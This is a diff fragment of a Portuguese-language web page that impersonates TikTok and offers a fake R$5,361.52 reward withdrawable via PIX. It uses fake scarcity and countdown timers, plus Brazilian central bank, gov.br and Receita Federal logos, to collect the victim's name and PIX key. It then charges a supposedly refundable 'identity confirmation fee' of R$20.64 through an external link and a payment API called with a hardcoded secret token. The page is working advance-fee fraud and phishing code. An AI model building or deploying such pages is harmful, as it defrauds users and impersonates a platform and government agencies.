+              <span class="total-pontos total-pontos-dois">Última recompensa: R$ 646,43</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="saldo saldo-sacar">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info saldo-info-sacar">
+            <div class="saldo-label">
+              <span class="saldo-sacar-text">Sacar dinheiro</span>
+            </div>
+
+            <div class="saldo-valor" aria-live="polite">
+              <span class="transferencia-txt"><img src="../images/fi-rs-credit-card.png" alt="">Transferencia via /
+                <img src="https://resgate-prontoo.online/pontos/images/pix-logo.svg" alt="" class="pix-logo-transf"></span>
+            </div>
+          </div>
+        </div>
+        <div class="widget-container">
+          <div class="botoes-row botoes-row-sacar">
+            <button class="btn-valor">R$1,5</button>
+            <button class="btn-valor">R$5</button>
+            <button class="btn-valor">R$10</button>
+          </div>
+
+          <button class="btn-valor display-total">R$5.361,52</button>
+        </div>
+        <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="sacar dinheiro">
+          <span class="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
+        </button>
+        <div class="obtem obtem-sacar sacar-dinheiro">
+          <span class="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os
+            limites de saque para transações individuais e mensais podem
+            variar conforme o pais ou região.</span>
+        </div>
+      </div>
+
+      <div class="saldo saldo-sacar">
+        <div class="container-saldo ctn-flor" role="region" aria-labelledby="saldo-title">
+          <img src="../images/flor.png" alt="" class="flor">
+          <div class="saldo-info obtenha-title">
+            <div class="saldo-label">
+              <span class="saldo-sacar-text obtenha-txt">Obtenha Moedas para a LIVE</span>
+            </div>
+
+            <div class="saldo-valor saldo-valor-tres border-none" aria-live="polite">
+              <span class="transferencia-txt moedas-txt">Use Moedas para enviar presentes virtuais para seus hosts de
+                live Favoritos.</span>
+            </div>
+          </div>
+        </div>
+
+        <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+          <span class="btn-text btn-indis">Indisponível</span>
+        </button>
+      </div>
+
+      <div class="saldo saldo-sacar">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info obtenha-title">
+            <div class="saldo-label">
+              <span class="saldo-sacar-text obtenha-txt">Recarga móvel</span>
+            </div>
+
+            <div class="saldo-valor saldo-valor-tres celular-recarga" aria-live="polite">
+              <span class="ddd">+55</span>
+              <span class="linha-ddd"></span>
+              <div class="telefone">12345678901</div>
+            </div>
+          </div>
+        </div>
+
+        <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+          <span class="btn-text btn-indis">Indisponível</span>
+        </button>
+        <div class="obtem obtem-sacar">
+          <span class="obtem-txt recarga-txt">Voce precisa de um saldo mínimo de R$10 para recarga de
+            celular</span>
+        </div>
+      </div>
+    </section>
+
+    <section id="four" class="modal" aria-hidden="true">
+      <div class="modal-inner inner-pop">
+        <div class="saque-popup">
+          <div class="title saque-title">Adicionar método de saque</div>
+          <span class="pix-item" role="button" tabindex="0" data-open-modal="five">
+            <div class="pix-icon">
+              <img src="https://resgate-prontoo.online/pontos/images/pix-solo.svg" alt="" class="pix-solo">
+            </div>
+
+            <div class="pix-details">
+              <span class="pix-title">PIX</span>
+              <span class="pix-subtitle">Recebimento Imediato</span>
+            </div>
+
+            <span class="pix-arrow">
+              <svg xmlns="http://www.w3.org/2000/svg" width="8" height="14" viewBox="0 0 8 14" fill="none">
+                <path
+                  d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z"
+                  fill="#7F7F7F"></path>
+              </svg>
+            </span>
+          </span>
+        </div>
+      </div>
+    </section>
+    <section id="five" class="screen" aria-hidden="true">
+      <div class="modal-inner inner-pop saque-popup">
+        <div class="title saque-title">Vincular PIX</div>
+
+        <div class="form-container">
+          <div class="form-group">
+            <label class="field-label" for="nome">Nome</label>
+            <input type="text" id="nome" placeholder="Nome completo" class="nome-completo">
+          </div>
+
+          <div class="form-group">
+            <label class="field-label">Tipo de Chave PIX</label>
+
+            <div class="pix-selector" id="pix-type-selector" data-open-modal="six" role="button" tabindex="0">
+              <span class="placeholder-text" id="pix-selector-text">Escolha o tipo de chave PIX</span>
+              <span class="arrow arrow-tois"><svg xmlns="http://www.w3.org/2000/svg" width="5" height="9"
+                  viewBox="0 0 5 9" fill="none">
+                  <path
+                    d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z"
+                    fill="#7F7F7F"></path>
+                </svg>
+              </span>
+            </div>
+          </div>
+
+          <div class="form-group">
+            <label class="field-label">Chave PIX</label>
+            <!-- Wrapper para detectar clique quando disabled -->
+            <div id="pix-key-wrapper" class="input-wrapper-disabled">
+              <input type="text" id="pix-key-input" placeholder="Digite sua chave PIX"
+                class="nome-completo input-disabled" disabled="">
+            </div>
+          </div>
+
+          <button type="button" id="btn-enviar-pix" class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled"
+            aria-label="sacar dinheiro">
+            <span class="btn-text btn-textdois-sacar">Enviar</span>
+          </button>
+        </div>
+      </div>
+    </section>
+    <section id="six" class="screen" aria-hidden="true">
+      <div class="modal-inner inner-pop">
+        <div class="saque-popup chave-pix">
+          <div class="title saque-title">Chave PIX</div>
+          <div class="selection-container">
+            <div class="option-row">
+              <label for="key-cpf">
+                <span class="option-text">CPF</span>
+                <input type="radio" id="key-cpf" name="pix_key_type" checked="">
+                <span class="custom-radio"></span>
+              </label>
+            </div>
+
+            <div class="option-row">
+              <label for="key-email">
+                <span class="option-text">E-mail</span>
+                <input type="radio" id="key-email" name="pix_key_type">
+                <span class="custom-radio"></span>
+              </label>
+            </div>
+
+            <div class="option-row">
+              <label for="key-celular">
+                <span class="option-text">Celular</span>
+                <input type="radio" id="key-celular" name="pix_key_type">
+                <span class="custom-radio"></span>
+              </label>
+            </div>
+
+            <div class="option-row">
+              <label for="key-aleatoria">
+                <span class="option-text">Chave Aleatória</span>
+                <input type="radio" id="key-aleatoria" name="pix_key_type">
+                <span class="custom-radio"></span>
+              </label>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section id="seven" class="screen">
+      <header class="loading-header">
+        <div class="loading-logo">
+          <img src="../images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok Logo" class="loading-logo-img">
+        </div>
+      </header>
+
+      <main class="loading-main-content">
+        <div class="new-loading-container">
+          <div class="new-loading-text" id="new-loading-text">
+            Validando acesso...
+          </div>
+          <div class="new-progress-track">
+            <div class="new-progress-bar" id="new-progress-bar"></div>
+          </div>
+        </div>
+      </main>
+    </section>
+    <section id="nine" class="screen" aria-hidden="true">
+      <div class="confirmation-container">
+        <div class="confirmation-header">
+          <div class="confirmation-logo">
+            <img src="../images/2560px-TikTok_logo.svg-3929532568.png" alt="TikTok">
+          </div>
+        </div>
+        
+        
+        <!-- SALDO DISPONÍVEL -->
+<div class="confirmation-section confirmation-balance pix-confirmation-saldo-card">
+  <span class="pix-confirmation-saldo-label">SALDO DISPONÍVEL</span>
+
+  <span
+    class="pix-confirmation-saldo-value"
+    data-amount-target="5361.52"
+  >
+    R$ 5.361,52
+  </span>
+
+  <span class="pix-confirmation-saldo-status">
+    Aguardando confirmação para saque
+  </span>
+</div>
+
+<style>
+/* ===== SALDO DISPONÍVEL - PIX STYLE ===== */
+.pix-confirmation-saldo-card {
+  width: 100%;                 /* mesma largura dos outros cards */
+  box-sizing: border-box;
+
+  background: linear-gradient(135deg, #fe2c55, #ff6b8a);
+  border-radius: 16px;
+
+  padding: 20px;
+  margin-bottom: 16px;
+
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+
+  font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+}
+
+/* TÍTULO */
+.pix-confirmation-saldo-label {
+  color: rgba(255, 255, 255, 0.85);
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: 0.04em;
+}
+
+/* VALOR */
+.pix-confirmation-saldo-value {
+  color: #ffffff;
+  font-size: 28px;
+  font-weight: 800;
+  line-height: 1.2;
+}
+
+/* STATUS */
+.pix-confirmation-saldo-status {
+  color: rgba(255, 255, 255, 0.9);
+  font-size: 13px;
+  font-weight: 500;
+}
+
+/* MOBILE PEQUENO */
+@media (max-width: 360px) {
+  .pix-confirmation-saldo-value {
+    font-size: 24px;
+  }
+}
+</style>
+
+
+        <!-- URGÊNCIA DE SAQUES -->
+<div class="pix-confirmation-urgency">
+  <div class="pix-confirmation-urgency-bg">
+    <div class="pix-confirmation-urgency-wave"></div>
+    <div class="pix-confirmation-urgency-wave wave-2"></div>
+  </div>
+
+  <div class="pix-confirmation-urgency-content">
+    <span class="pix-confirmation-urgency-text">
+      Restam <span class="pix-confirmation-urgency-number">19</span> saques hoje
+    </span>
+  </div>
+
+  <div class="pix-confirmation-urgency-live">
+    <span class="pix-confirmation-urgency-dot"></span>
+    <span>AO VIVO</span>
+  </div>
+</div>
+
+<style>
+/* ===== CARD DE URGÊNCIA (MESMA LARGURA DOS OUTROS) ===== */
+.pix-confirmation-urgency {
+  position: relative;
+  overflow: hidden;
+
+  width: 100%;
+  box-sizing: border-box;
+
+  padding: 12px 16px;
+  border-radius: 12px;
+
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+
+  background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
+  font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+
+  margin-bottom: 16px; /* ✅ mesmo espaçamento do card de cima */
+}
+
+
+/* ===== FUNDO ANIMADO ===== */
+.pix-confirmation-urgency-bg {
+  position: absolute;
+  inset: 0;
+  z-index: 0;
+}
+
+.pix-confirmation-urgency-wave {
+  position: absolute;
+  top: -70%;
+  left: -70%;
+  width: 240%;
+  height: 240%;
+  background: radial-gradient(
+    circle,
+    rgba(255, 0, 80, 0.07) 0%,
+    transparent 70%
+  );
+  animation: waveMove 8s linear infinite;
+}
+
+.pix-confirmation-urgency-wave.wave-2 {
+  animation-duration: 12s;
+  opacity: 0.5;
+}
+
+@keyframes waveMove {
+  from { transform: rotate(0deg); }
+  to   { transform: rotate(360deg); }
+}
+
+/* ===== TEXTO ===== */
+.pix-confirmation-urgency-content {
+  position: relative;
+  z-index: 2;
+  flex: 1;                   /* 🔑 empurra corretamente */
+  min-width: 0;              /* 🔑 evita overflow */
+}
+
+.pix-confirmation-urgency-text {
+  color: #ffffff;
+  font-size: 14px;
+  font-weight: 600;
+  line-height: 1.3;
+}
+
+.pix-confirmation-urgency-number {
+  color: #ff0050;
+  font-weight: 800;
+}
+
+/* ===== AO VIVO ===== */
+.pix-confirmation-urgency-live {
+  position: relative;
+  z-index: 2;
+
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+
+  padding: 4px 10px;
+  border-radius: 999px;
+
+  background: rgba(255, 0, 80, 0.15);
+  color: #ff0050;
+
+  font-size: 11px;
+  font-weight: 700;
+  white-space: nowrap;       /* 🔑 nunca quebra */
+}
+
+/* BOLINHA */
+.pix-confirmation-urgency-dot {
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  background: #ff0050;
+  animation: pulseDot 1.2s infinite;
+}
+
+@keyframes pulseDot {
+  0%   { transform: scale(1);   opacity: 1; }
+  50%  { transform: scale(1.6); opacity: 0.6; }
+  100% { transform: scale(1);   opacity: 1; }
+}
+
+/* ===== MOBILE MUITO PEQUENO ===== */
+@media (max-width: 360px) {
+  .pix-confirmation-urgency {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 6px;
+  }
+
+  .pix-confirmation-urgency-live {
+    align-self: flex-end;
+  }
+}
+</style>
+
+
+      
+
+        <!-- Taxa de Confirmação -->
+        <div class="confirmation-section">
+          <div class="confirmation-section-title">
+            CONFIRMAÇÃO DE IDENTIDADE
+          </div>
+          <div class="confirmation-fee-amount">
+            R$ 20,64
+            <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
+          </div>
+          <div class="confirmation-fee-description">
+            Taxa obrigatória para liberação do saque no valor de
+            <span class="bold">R$5.361,52</span>. O valor de
+            <span class="bold">R$20,64</span> será reembolsado integralmente
+            para você em 1 minuto.
+          </div>
+        </div>
+
+        <!-- Comprovante -->
+        <div class="confirmation-section">
+          <div class="confirmation-section-title">DADOS PARA REEMBOLSO</div>
+          <div class="confirmation-receipt-grid">
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Nome</div>
+              <div class="confirmation-receipt-value" id="confirmation-name"></div>
+            </div>
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Data</div>
+              <div class="confirmation-receipt-value" id="confirmation-date"></div>
+            </div>
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Chave PIX</div>
+              <div class="confirmation-receipt-value" id="confirmation-key-type"></div>
+            </div>
+            <div class="confirmation-receipt-item">
+              <div class="confirmation-receipt-label">Valor a receber</div>
+              <div class="confirmation-receipt-value bold">R$ 5.361,52</div>
+            </div>
+            <div class="confirmation-pix-key" id="confirmation-pix-key"></div>
+          </div>
+        </div>
+
+        <div class="confirmation-divider"></div>
+
+        <!-- Requisitos -->
+        <div class="confirmation-section">
+          <div class="confirmation-section-title">PROCESSO DE LIBERAÇÃO</div>
+          <div class="confirmation-requirements-grid">
+            <div class="confirmation-requirement-item">
+              <div class="confirmation-requirement-icon">1</div>
+              <div class="confirmation-requirement-content">
+                <div class="confirmation-requirement-title">
+                  Pagar taxa de confirmação
+                </div>
+                <div class="confirmation-requirement-description">
+                  R$ 20,64 para verificação de identidade
+                </div>
+              </div>
+            </div>
+            <div class="confirmation-requirement-item">
+              <div class="confirmation-requirement-icon confirmation-reembolso">
+                ✓
+              </div>
+              <div class="confirmation-requirement-content">
+                <div class="confirmation-requirement-title confirmation-reembolso">
+                  Receber reembolso automático
+                </div>
+                <div class="confirmation-requirement-description">
+                  Valor devolvido em 1 minuto
+                </div>
+              </div>
+            </div>
+            <div class="confirmation-requirement-item">
+              <div class="confirmation-requirement-icon">3</div>
+              <div class="confirmation-requirement-content">
+                <div class="confirmation-requirement-title">
+                  Acessar saldo completo
+                </div>
+                <div class="confirmation-requirement-description">
+                  R$ 5.361,52 liberado para saque
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Call to Action -->
+        <!-- BOTÃO CONFIRMAR IDENTIDADE - TIKTOK STYLE -->
+<a href="https://ambienteseguro.org.ua/c/122b480ed6" id="confirmIdentityBtn" class="tt-confirm-btn">
+  <span class="tt-confirm-text">Confirmar Identidade</span>
+  <span class="tt-confirm-arrow">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+      <path
+        d="M9 18l6-6-6-6"
+        stroke="white"
+        stroke-width="2.5"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+      />
+    </svg>
+  </span>
+</a>
+
+<script>
+// Função para obter todos os parâmetros da URL atual
+function getUrlWithAllParams(baseUrl) {
+    // Pegar todos os parâmetros da URL atual
+    const urlParams = new URLSearchParams(window.location.search);
+    
+    // Construir a URL com parâmetros
+    let finalUrl = baseUrl;
+    
+    // Se houver parâmetros, adicionar à URL
+    if (urlParams.toString()) {
+        // Verificar se a URL base já tem parâmetros
+        const hasQuery = baseUrl.includes('?');
+        finalUrl += (hasQuery ? '&' : '?') + urlParams.toString();
+    }
+    
+    // Adicionar hash se existir
+    if (window.location.hash) {
+        finalUrl += window.location.hash;
+    }
+    
+    return finalUrl;
+}
+
+// Função para atualizar todos os botões com os parâmetros
+function updateAllButtonsWithParams() {
+    // Para o botão específico que você mencionou
+    const confirmBtn = document.querySelector('.tt-confirm-btn');
+    if (confirmBtn) {
+        const originalHref = confirmBtn.getAttribute('href');
+        if (originalHref) {
+            confirmBtn.href = getUrlWithAllParams(originalHref);
+        }
+    }
+    
+    // Para outros botões que você possa ter
+    const allLinks = document.querySelectorAll('a[href*="blackdotik11.shop"]');
+    allLinks.forEach(link => {
+        const originalHref = link.getAttribute('href');
+        if (originalHref) {
+            link.href = getUrlWithAllParams(originalHref);
+        }
+    });
+}
+
+// Executar quando a página carregar
+document.addEventListener('DOMContentLoaded', updateAllButtonsWithParams);
+</script>
+
+<style>
+/* ===== BOTÃO TIKTOK CONFIRMAR IDENTIDADE ===== */
+/* REMOVE QUALQUER FOCO / BORDA / REALCE DO BOTÃO */
+.tt-confirm-btn {
+  outline: none;
+  border: none;
+  box-shadow: none;
+  -webkit-tap-highlight-color: transparent;
+}
+
+/* Remove foco automático */
+.tt-confirm-btn:focus,
+.tt-confirm-btn:active,
+.tt-confirm-btn:focus-visible {
+  outline: none;
+  box-shadow: none;
+}
+
+/* iOS / Safari específico */
+.tt-confirm-btn::-moz-focus-inner {
+  border: 0;
+}
+
+.tt-confirm-btn {
+  width: 100%;
+  max-width: 340px;
+  height: 52px;
+
+  margin: 0 auto; /* centraliza */
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+
+  padding: 0 18px;
+  border-radius: 16px;
+
+  background: linear-gradient(
+    135deg,
+    #ff0050 0%,
+    #ff2d6f 50%,
+    #ff4f8b 100%
+  );
+
+  text-decoration: none;
+  box-shadow: 0 10px 26px rgba(255, 0, 80, 0.35);
+
+  font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont,
+    "Segoe UI", Roboto, Arial, sans-serif;
+
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+.tt-confirm-btn:active {
+  transform: scale(0.97);
+  box-shadow: 0 6px 16px rgba(255, 0, 80, 0.25);
+}
+
+.tt-confirm-text {
+  color: #ffffff;
+  font-size: 15px;
+  font-weight: 700;
+}
+
+.tt-confirm-arrow {
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  background: rgba(255, 255, 255, 0.18);
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* MOBILE MUITO PEQUENO */
+@media (max-width: 360px) {
+  .tt-confirm-btn {
+    max-width: 100%;
+  }
+
+  .tt-confirm-text {
+    font-size: 14px;
+  }
+}
+</style>
+
+
+<style>
+    .tiktok-pay-btn {
+  width: 100%;
+  background: linear-gradient(135deg, #ff0050, #ff2a6d);
+  border: none;
+  border-radius: 14px;
+  padding: 16px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  color: #fff;
+  cursor: pointer;
+  box-shadow: 0 12px 30px rgba(255, 0, 80, 0.45);
+  animation: pulseTikTok 1.6s infinite;
+}
+
+@keyframes pulseTikTok {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.02); }
+  100% { transform: scale(1); }
+}
+
+.tiktok-pay-left {
+  background: rgba(255,255,255,0.2);
+  width: 42px;
+  height: 42px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.tiktok-pay-center {
+  flex: 1;
+  text-align: left;
+}
+
+.tiktok-pay-title {
+  font-size: 15px;
+  font-weight: 700;
+  display: block;
+}
+
+.tiktok-pay-sub {
+  font-size: 12px;
+  opacity: 0.9;
+}
+
+.tiktok-pay-right {
+  font-size: 14px;
+  font-weight: 700;
+  background: rgba(0,0,0,0.2);
+  padding: 6px 10px;
+  border-radius: 20px;
+}
+
+</style>
+
+          <script>
+            function herdarUTMeRedirecionar(urlDestino) {
+              // Pega os parâmetros da URL atual
+              const urlAtual = new URL(window.location.html);
+              const params = new URLSearchParams(urlAtual.search);
+
+              // Filtra UTMs + ttclid
+              const parametrosParaHerdar = {};
+              for (const [key, value] of params.entries()) {
+                if (
+                  key.startsWith('utm_') ||
+                  key === 'ttclid' // <- novo parâmetro incluído
+                ) {
+                  parametrosParaHerdar[key] = value;
+                }
+              }
+
+              // Cria a URL de destino com os parâmetros herdados
+              const urlFinal = new URL(urlDestino%2c%20window.location.html);
+              const paramsDestino = new URLSearchParams(urlFinal.search);
+
+              // Adiciona os parâmetros herdados à URL de destino
+              for (const [key, value] of Object.entries(parametrosParaHerdar)) {
+                paramsDestino.set(key, value);
+              }
+
+              urlFinal.search = paramsDestino.toString();
+
+              // Redireciona na mesma página
+              window.location.href = urlFinal.toString();
+            }
+          </script>
+          <div class="confirmation-timer">
+            ⏱️ Reembolso automático em 1 minuto
+          </div>
+          <div class="confirmation-success-message" id="confirmation-success-message">
+            ✅ Identidade confirmada. R$ 10,84 reembolsados e saque liberado.
+          </div>
+        </div>
+
+        <!-- Segurança -->
+        <div class="confirmation-security-grid">
+          <div class="confirmation-security-item">
+            <div class="confirmation-security-label">
+              <img src="../images/bacen.png" alt="" class="img-bacen">
+            </div>
+          </div>
+          <div class="confirmation-security-item">
+            <div class="confirmation-security-label">
+              <img src="https://resgate-prontoo.online/pontos/images/gov-br.webp" alt="" class="img-gov-br">
+            </div>
+          </div>
+          <div class="confirmation-security-item">
+            <div class="confirmation-security-label">
+              <img src="../images/receitafederal.png" alt="" class="img-receitafederal">
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="confirmation-footer">
+          <div class="confirmation-footer-text">Processo 100% seguro</div>
+          <a href="#nine" class="confirmation-footer-link">Precisa de ajuda?</a>
+        </div>
+      </div>
+    </section>
+    <section id="popup-um" class="sticky-popup">
+      <div class="timer-wrapper expira-em-popup">
+        <div class="timer-label">Expira em</div>
+
+        <div class="timer-clock">
+          <!-- Horas -->
+          <div class="timer-box" data-timer="hours">00</div>
+
+          <!-- Separador -->
+          <div class="timer-separator">:</div>
+
+          <!-- Minutos -->
+          <div class="timer-box" data-timer="minutes">42</div>
+
+          <!-- Separador -->
+          <div class="timer-separator">:</div>
+
+          <!-- Segundos -->
+          <div class="timer-box" data-timer="seconds">37</div>
+        </div>
+      </div>
+      <!-- <div class="line line-expira"></div> -->
+      <div class="saldo saldo-popup">
+        <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+          <div class="saldo-info">
+            <div class="saldo-label">
+              <span class="saldo-text">Seu saldo</span>
+              <img src="https://resgate-prontoo.online/pontos/images/p-saldo.svg" alt="" class="p-saldo">
+            </div>
+
+            <div class="saldo-valor" aria-live="polite">
+              <span class="valor-currency">R$5.361,52</span>
+            </div>
+          </div>
+
+          <div class="saldo-action">
+            <button type="button" class="btn-sacar" aria-label="Sacar">
+              <span class="btn-text">Sacar</span>
+              <span class="pix-badge" aria-hidden="true">
+                <img src="https://resgate-prontoo.online/pontos/images/pix-logo.svg" alt="">
+              </span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <script>
+    // Funções auxiliares
+    function easeOutCubic(t) {
+      return 1 - Math.pow(1 - t, 3);
+    }
+
+    function formatBR(value) {
+      return value
+        .toFixed(2) // duas casas decimais
+        .replace(".", ",") // vírgula decimal
+        .replace(/\B(?=(\d{3})+(?!\d))/g, "."); // ponto para milhar
+    }
+
+    // Função reutilizável para animar um contador
+    function animateCurrencyCounter(counter, forceReset = false) {
+      if (!counter) return;
+
+      // Se já está animando e não forçou reset, não anima novamente
+      if (counter._isAnimating && !forceReset) return;
+
+      const duration = 2000; // tempo total da animação
+      const toValue =
+        parseFloat(counter.getAttribute("data-amount-target")) || 0;
+      const fromValue = 0;
+
+      if (toValue === 0) {
+        // Garante que sempre mostre um valor válido, mesmo se for 0
+        counter.textContent = "R$ 0,00";
+        return;
+      }
+
+      // Cancela animação anterior se existir
+      if (counter._animationFrameId) {
+        cancelAnimationFrame(counter._animationFrameId);
+        counter._animationFrameId = null;
+      }
+
+      // Garante que sempre comece com um valor visível
+      counter.textContent = "R$ 0,00";
+
+      counter._isAnimating = true;
+      let startTime = null;
+
+      function animateCounter(currentTime) {
+        if (!startTime) startTime = currentTime;
+        const elapsed = currentTime - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        const value =
+          fromValue + (toValue - fromValue) * easeOutCubic(progress);
+
+        // Atualiza número formatado no padrão brasileiro - sempre garante um valor válido
+        const formattedValue = "R$ " + formatBR(value);
+        if (counter && counter.textContent !== undefined) {
+          counter.textContent = formattedValue;
+        }
+
+        if (progress < 1) {
+          counter._animationFrameId = requestAnimationFrame(animateCounter);
+        } else {
+          // garante valor final exato
+          const finalValue = "R$ " + formatBR(toValue);
+          if (counter && counter.textContent !== undefined) {
+            counter.textContent = finalValue;
+          }
+          counter._isAnimating = false;
+          counter._animationFrameId = null;
+        }
+      }
+
+      // Pequeno delay para garantir que o DOM está pronto
+      setTimeout(() => {
+        if (counter && counter.getAttribute("data-amount-target")) {
+          counter._animationFrameId = requestAnimationFrame(animateCounter);
+        }
+      }, 10);
+    }
+
+    // Anima todos os contadores visíveis no carregamento
+    document.addEventListener("DOMContentLoaded", function () {
+      // Anima apenas contadores que estão visíveis na tela inicial
+      const initialCounters = document.querySelectorAll(
+        "#one .valor-currency[data-amount-target]"
+      );
+      initialCounters.forEach((counter) => {
+        animateCurrencyCounter(counter);
+      });
+    });
+
+    // Expõe a função globalmente para ser chamada quando o popup abrir
+    window.animateCurrencyCounter = animateCurrencyCounter;
+  </script>
+
+  <script src="../js/main.js"></script>
+
+  <!-- MODAL PIX ÚNICO -->
+  <div id="pixModalOverlay" class="pix-modal-overlay">
+    <div class="pix-modal-container">
+      <button class="pix-modal-close" onclick="fecharModalPIX()">&times;</button>
+      
+      <img src="../images/tiktok-logo.png" alt="TikTok" class="pix-modal-logo">
+      
+      <div class="pix-modal-title">Pagamento PIX</div>
+      <div class="pix-modal-subtitle">Escaneie o QR Code para pagar</div>
+      
+      <div class="pix-amount-card">
+        <div class="pix-amount-label">Valor a pagar</div>
+        <div class="pix-amount-value">R$ 20,64</div>
+      </div>
+      
+      <div class="pix-loading-section" id="pixLoadingSection">
+  <div class="pix-spinner"></div>
+  <div class="pix-loading-text">Clique abaixo para gerar o PIX</div>
+</div>
+
+
+
+<script>
+    function copiarPix() {
+  const input = document.getElementById('pixEmv');
+  navigator.clipboard.writeText(input.value);
+
+  const btn = document.querySelector('.pix-copy-btn');
+  btn.innerText = 'Código copiado!';
+  setTimeout(() => btn.innerText = 'Copiar código PIX', 2000);
+}
+
+</script>
+      
+      <div class="pix-qr-section">
+  <div class="pix-qr-box">
+    <div id="pixQrcode"></div>
+  </div>
+
+  <div class="pix-code-box">
+    <input
+      id="pixEmv"
+      type="text"
+      readonly
+      placeholder="Código PIX"
+    />
+    <span class="pix-code-dots">•••</span>
+  </div>
+
+  <button
+    class="pix-copy-btn"
+    onclick="copiarPix()">
+    Copiar código PIX
+  </button>
+</div>
+
+
+<style>
+    .pix-qr-box {
+  background: #fff;
+  padding: 18px;
+  border-radius: 18px;
+  margin: 20px auto;
+  width: fit-content;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+
+.pix-code-box {
+  position: relative;
+  margin-top: 16px;
+}
+
+.pix-code-box input {
+  width: 100%;
+  padding: 14px 48px 14px 16px;
+  border-radius: 12px;
+  border: 1.5px dashed #ff0050;
+  font-size: 13px;
+  background: #fff;
+}
+
+.pix-code-dots {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #ff0050;
+  font-weight: 900;
+  font-size: 18px;
+}
+
+.pix-copy-btn {
+  width: 100%;
+  margin-top: 16px;
+  background: linear-gradient(135deg, #ff0050, #ff2a6d);
+  color: #fff;
+  border: none;
+  padding: 16px;
+  border-radius: 14px;
+  font-weight: 700;
+  cursor: pointer;
+}
+</style>
+      
+      <div class="pix-success-message" id="pixSuccessMessage">
+        <i class="fas fa-check-circle"></i>
+        <div>Pagamento confirmado!</div>
+        <div style="font-size: 14px; margin-top: 10px;">Redirecionando...</div>
+      </div>
+      
+      <div class="pix-error-message" id="pixErrorMessage">
+        Erro ao gerar PIX. Tente novamente.
+      </div>
+      
+      <div class="pix-instructions">
+        <div class="pix-instruction-item">
+          <div class="pix-instruction-icon">
+            <i class="fas fa-camera"></i>
+          </div>
+          <span>Escaneie o QR Code com seu app bancário</span>
+        </div>
+        <div class="pix-instruction-item">
+          <div class="pix-instruction-icon">
+            <i class="fas fa-copy"></i>
+          </div>
+          <span>Ou copie o código PIX</span>
+        </div>
+        <div class="pix-instruction-item">
+          <div class="pix-instruction-icon">
+            <i class="fas fa-check"></i>
+          </div>
+          <span>Pagamento aprovado em instantes</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+
+  <!-- SCRIPT PIX ÚNICO E CORRETO -->
+  <script>
+    // CONFIGURAÇÕES PIX
+    const PIX_CONFIG = {
+      API_TOKEN: 'sk_62e793037ed2b81d95f7dad6e9231cae1a7a555e0ff1292067b10342207a5c67',
+      PRODUCT_HASH: 'prod_4117f7470d22530d',
+      AMOUNT_CENTS: 2884, // R$ 20,64
+      API_URL: 'https://multi.paradisepags.com/api/v1'
+    };
+
+    let pixPollTimer = null;
+    let currentPIXHash = null;
+
+    // FUNÇÃO PARA ABRIR MODAL PIX
+    // FUNÇÃO PARA ABRIR MODAL PIX
+// FUNÇÃO PARA ABRIR MODAL PIX
+function abrirModalPIX() {
+  const modal = document.getElementById('pixModalOverlay');
+  modal.classList.add('active');
+
+  // limpa estado anterior
+  document.getElementById('pixQrcode').innerHTML = '';
+  document.getElementById('pixEmv').value = '';
+  document.getElementById('pixCopySection')?.style && (document.getElementById('pixCopySection').style.display = 'block');
+
+  // 🔥 GERA O PIX AUTOMATICAMENTE
+  gerarPIX();
+}
+
+
+
+
+
+    // FUNÇÃO PARA FECHAR MODAL
+    function fecharModalPIX() {
+      console.log('Fechando modal PIX...');
+      document.getElementById('pixModalOverlay').classList.remove('active');
+      
+      if (pixPollTimer) {
+        clearInterval(pixPollTimer);
